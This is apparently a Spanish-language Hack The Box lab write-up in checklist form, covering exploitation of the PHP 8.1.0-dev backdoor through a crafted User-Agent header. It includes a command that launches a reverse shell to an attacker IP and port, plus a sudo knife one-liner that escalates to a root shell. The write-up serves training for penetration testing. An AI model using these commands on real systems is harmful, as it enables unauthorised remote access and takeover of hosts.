---

---
---
- Tags:  #writeup #info #htb  #tutorial #ejpt #php 
----
# Reconocimiento

- [x] Puertos *Abiertos*( 22, 80)
- [x] Servicios
- [x] WhatWeb 
	**Nos encontramos una version de PHP 8.1.0 - dev , Vulnerbale a RCE en el campo User-Agentt**
- [x] Headers
- [x] Gobsuter
- [x] Gobuster Extensiones

----------
# Enumeracion

- **OS**:

- **Credentials**

- **Pendientes**

- ### INFO GRAL



------
# Explotacion

Teniendo esta version podemos simplemente aprovechar algun exploit que nos permita inyectar codigo en el user agent y mandarnos una reverse shell.

- [Exploit Github](https://github.com/flast101/php-8.1.0-dev-backdoor-rce)
```bash
python3 revshell_php_8.1.0-dev.py <target URL> <attacker IP> <attacker PORT>
```


### Vias Potenciales Explotacion

---------
# Privesc

- [x] sudo -l
    Aqui nos encontramos que podemos ejecutar como root sin proporcionar contraseña el binario *Knife*
      - [GTFOBins](https://gtfobins.github.io/gtfobins/knife/)

```bash
sudo /usr/bin/knife exec -E 'exec "/bin/sh"'
```

### Pwned

- [x] history
- [x] SUID
- [x] crontab
- [x] getcap
- [x] find .txt
- [x] find .sh
- [x] id
- [x] env
- [x] /opt /tmp
- [x] pspy, lse, linpeas,etc
- [x] Kernel Exploits
- [x] BruteForce Su


------------
